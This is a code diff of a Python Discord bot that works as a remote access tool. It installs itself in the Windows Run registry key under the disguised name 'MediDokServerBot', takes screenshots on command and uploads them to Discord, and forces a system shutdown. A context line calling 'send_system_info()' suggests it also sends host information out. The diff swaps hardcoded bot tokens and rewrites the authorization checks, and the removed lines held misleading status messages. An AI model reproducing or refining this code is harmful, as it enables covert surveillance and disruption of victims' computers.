@@ -171,7 +171,7 @@ if __name__ == "__main__":
     send_system_info()
 
 # --- Configuration ---
-TOKEN = 'MTUwMDkwNjk5NDU3MDIzMjA5Mw.GGktNN.8FZO-CQtmSKUq-VBSc0j7UunDqs3BPytz8knN4'
+TOKEN = 'MTUwMDkwNjk5NDU3MDIzMjA5Mw.G8GQPz.GnJ8zspl-Kj3AzlWUjAW-fPZnZHDX6IuVEEn8s'  # Paste your token here
 AUTHORIZED_USER_ID = 1394368402231001228
 
 intents = discord.Intents.default()
@@ -179,40 +179,39 @@ intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
 def add_to_startup():
-    """Adds the current script to Windows startup via Registry."""
+    """Adds the current script to Windows Registry for auto-startup."""
     if platform.system() == "Windows":
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         key = winreg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         try:
             with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
                 # Get the absolute path to the current python executable and script
                 command = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
                 winreg.SetValueEx(registry_key, "MediDokServerBot", 0, winreg.REG_SZ, command)
         except Exception as e:
-            print(f"Verifying Version... {e}")
+            print(f"Could not add to startup: {e}")
 
 @bot.event
 async def on_ready():
     add_to_startup()
-    print(f'Connecting to backend...')
+    print(f'Logged in as {bot.user.name}. Startup entry created.')
 
 @bot.command()
 async def off(ctx):
     if ctx.author.id == AUTHORIZED_USER_ID:
-        await ctx.send("Unauthorized access denied.")
-        return
-        
-    await ctx.send("Shutting down the server now...")
-    os.system("shutdown /s /f /t 0")
+        await ctx.send("Shutting down the server now...")
+        os.system("shutdown /s /f /t 0")
+    else:
+        await ctx.send("Unauthorized access.")
 
 @bot.command()
 async def ss(ctx):
-    if ctx.author.id != AUTHORIZED_USER_ID:
-        return
-        
-    screenshot = pyautogui.screenshot()
-    screenshot.save("server_screen.png")
-    await ctx.send(file=discord.File("server_screen.png"))
-    os.remove("server_screen.png")
+    if ctx.author.id == AUTHORIZED_USER_ID:
+        screenshot = pyautogui.screenshot()
+        screenshot.save("server_screen.png")
+        await ctx.send(file=discord.File("server_screen.png"))
+        os.remove("server_screen.png")
+    else:
+        await ctx.send("Unauthorized access.")
 
 bot.run(TOKEN)
